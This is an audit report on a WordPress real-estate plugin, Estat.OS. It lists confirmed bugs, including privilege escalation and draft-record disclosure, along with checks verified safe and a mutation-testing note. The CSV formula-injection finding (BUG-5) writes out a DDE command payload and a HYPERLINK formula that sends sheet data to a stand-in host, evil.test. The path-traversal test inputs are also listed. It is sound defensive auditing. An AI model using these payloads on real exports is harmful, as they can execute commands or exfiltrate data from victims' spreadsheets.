# Estat.OS — full audit findings

## Confirmed real bugs

### BUG-1 — A property cannot be deleted (user-facing, HIGH)
`trash_listing` is declared in `Actions::CAPS` with cap `estat_delete_listings`
but is **never routed** in `handle()` and no screen offers a delete control.
`PostTypes` sets `show_in_menu => false`, so WordPress's own list table is not
reachable either. Net effect: an office that adds a property by mistake has no
way to remove it. Also leaves a dead entry in the capability map.

### HARNESS-GAP-1 — the test stub only kept one endpoint per REST path (fixed)
`register_rest_route()` accepts either a single endpoint definition or a list of
them (the list form is how one path serves GET and POST). The stub overwrote the
path with the raw argument, so for `/leads` and `/visits` the test world saw a
route with **no permission_callback at all** and any audit run over the stub
would have reported those two paths as unprotected. The plugin source was always
correct. Stub fixed to record every endpoint; a permission audit now sees 14
endpoints, 0 missing a permission callback.

### BUG-2 — `/projects/{id}/stats` answers for unpublished projects (MEDIUM)
`RestApi::get_project_stats()` checks only `get_post_type()`, not
`post_status`. `get_property()` right beside it does check for `publish`.
A visitor can walk numeric ids and learn which ids are projects the office has
not announced yet (draft, pending, private, even trashed). The figures come back
zero because the listings inside are drafts, but the existence of the record is
confirmed, which is itself a disclosure.

### BUG-3 — `Components::card()` renders an unpublished listing (LOW/defence-in-depth)
`card()` calls `Listings::to_array()` and never checks `post_status`. The
directory and the `[estat_properties]` shortcode both filter to published
listings before calling it, so there is no public path today — but the Elementor
"Property Card" widget passes an editor-chosen id straight through. An editor
who pins a draft to a page publishes it by accident. The function is public API
(`Frontend\Components`), so a theme could reach it too.

### BUG-4 — verification state can be self-raised without the capability (HIGH, privilege escalation)
`estat_verify_listings` exists as a capability and `Listings::save_meta()` even
carries the comment *"Only authorised staff may raise the verification state."*
— but the code under that comment deletes `_estat_verification_pending`, a meta
key that is **never written anywhere in the plugin**. The real key,
`_estat_verification`, is written unconditionally with the rest of the meta.

Proven: an agent holding only `estat_manage_listings` + `estat_publish_listings`
saved a listing with `verification => office_verified` and it was stored. The
"Verified by our office" badge is a trust signal shown to buyers, so any agent
can vouch for their own inventory. The guard is decorative.

### OBS-1 — a site visit can be booked against a lead that does not exist (LOW)
`Visits::schedule()` validates the date and requires a lead id, but never checks
the lead is real. `lead_id => 999999` is accepted. Nothing crashes — every
screen renders — so this is data hygiene, not a fault. Worth a foreign-key style
check so a bad API call cannot litter the visits table.

### NOT-A-BUG — lead dedupe merging two questions the same day
Verified: a second, different question from the same person about the same
property is merged into the existing enquiry **and the new question is appended
as a note** ("Asked again: ..."). Nothing is lost, and enquiries about different
properties are correctly kept apart. Working as intended.

### NOT-A-BUG — verification value rejected
`verification => 'verified'` is not one of the three valid values
(`unverified`, `self_verified`, `office_verified`); the plugin correctly fell
back to the safe default. My first test used the wrong value.

### BUG-5 — CSV formula injection on export (HIGH, reachable from the public form)
`Spreadsheet::export()` writes cell values straight to `fputcsv()` with no
guard. A cell beginning `=`, `+`, `-`, `@`, tab or CR is treated as a **formula**
by Excel and LibreOffice.

Proven end to end: a website visitor submits an enquiry with the name
`=cmd|' /C calc'!A0` and a message
`+HYPERLINK("http://evil.test?d="&A1,"Click me")`. Exporting Enquiries produces
4 executable cells; exporting Listings produces 1 from a staff-typed title.
Opening that file can run a command or silently exfiltrate the sheet.

The attacker needs no account — the public enquiry form is the entry point, and
the victim is the office owner opening their own export. The import side already
has a path-traversal guard, so the omission is on the write path only.

### VERIFIED SAFE — uninstall and deactivate
Deactivating changes nothing: listings and enquiries both survive.
`delete_data_on_uninstall` defaults to `false`, and with it off `uninstall.php`
returns immediately and touches nothing. With the office explicitly opting in,
the 8 custom tables are dropped, options removed and roles removed — so the
opt-in genuinely works too, it is not a dead switch.
Harness limit: the fake database does not store WordPress posts, so the
post-deletion loop inside uninstall cannot be exercised here. Needs one manual
check on a real site.

### VERIFIED SAFE — webhook signing
HMAC-SHA256 over `timestamp . "." . body`, 64-char hex. Changing the secret, the
body or the timestamp each change the signature; `hash_equals` is used for
comparison (no timing leak) and the secret never reaches the webhook log.

### VERIFIED SAFE — CSV import path containment
`/etc/passwd` and a `../../../..` escape from the uploads folder were both
refused with `estat_bad_path`. Imported rows land as **drafts**, so a bad file
can never publish itself to the website.

### OBS-2 — "price on request" is hidden from the office's own private view (LOW)
`Listings::to_array($id, $private = true)` returns `price => null` for an
on-request listing, exactly like the public view. The number is **not lost** —
it is stored in `_estat_price` and the edit screen shows it — but the private
API view and anything built on it cannot see the office's own figure. The
private view is supposed to be the one that shows internal data. Cosmetic
inconsistency, no leak.

### VERIFIED SAFE — price on request never leaks
With a real 7,500,000 stored behind the on-request tick, the public payload
contains no trace of the number (`price => null`, label "Price on request") and
the figure appears nowhere in the JSON. Publishing with no price at all is
correctly refused with a plain-English message.

### VERIFIED SAFE — search filters and scale
Seeded 10,000 index rows: every query stayed bounded and paged (12 per page),
`per_page => 5000` was capped to 60, deep paging to page 300 behaved, and peak
memory stayed at 36 MB. Filter results were cross-checked against the table
directly — bedrooms, area, offer and price bands all MATCH. No unbounded
`posts_per_page => -1` anywhere in runtime code; the Elementor pickers cap at
200. Timings here come from the in-memory test database, so they show
correctness and boundedness, not real MySQL speed.

### VERIFIED SAFE — browser JavaScript
4 files, 2,086 lines. No `eval`, no `new Function`, no `document.write`. The
only `innerHTML` uses set the empty string (clearing a panel), never user text;
user values go in through `textContent`. The single `fetch` carries the upload
nonce and `credentials: 'same-origin'`. Every file is in strict mode.

### VERIFIED SAFE — translations
1,373 translatable strings, every single one on the `estat-os` text domain (zero
strays), and the domain is loaded from `/languages`. Ready for the Hinglish
phase later without rework.

---

## AUDIT COMPLETE

Baseline re-run after the audit: **49 unit passing, 899 integration passing, 0 failing.**

**Real bugs found: 5.**
- BUG-1 (HIGH) — nothing can be deleted, at all.
- BUG-2 (MEDIUM) — project stats confirm draft/trashed projects to anonymous visitors.
- BUG-3 (LOW) — the property card widget will render a draft if an editor picks one.
- BUG-4 (HIGH) — an ordinary agent can mark their own listing "office verified".
- BUG-5 (HIGH) — CSV export writes formulas a visitor typed into the enquiry form.

**Small observations: 2** (orphan visits, on-request price hidden from the office's own private view).

**Cleared as genuinely safe:** SQL injection, XSS, REST permissions, public data
leakage, capability downgrade, CSV path containment, webhook HMAC, uninstall
data retention, search scale and filter correctness, browser JavaScript,
translations, and zero hardcoded company details.

---

## Setup wizard (v1.6.0) — mutation testing note

Six mutations were run against the new setup code. Five were caught immediately.
The sixth — removing the "this page already exists" check in `Pages::create()` —
was **not** caught, and investigation showed why: a second, independent guard
(adopting any page that already has the same slug) also prevents duplicates. The
behaviour was correct; there are genuinely two layers. Removing *both* guards
does produce a duplicate page and the tests then fail, so the protection is
real and covered. Recorded here so the single surviving mutation is not
mistaken for a gap.
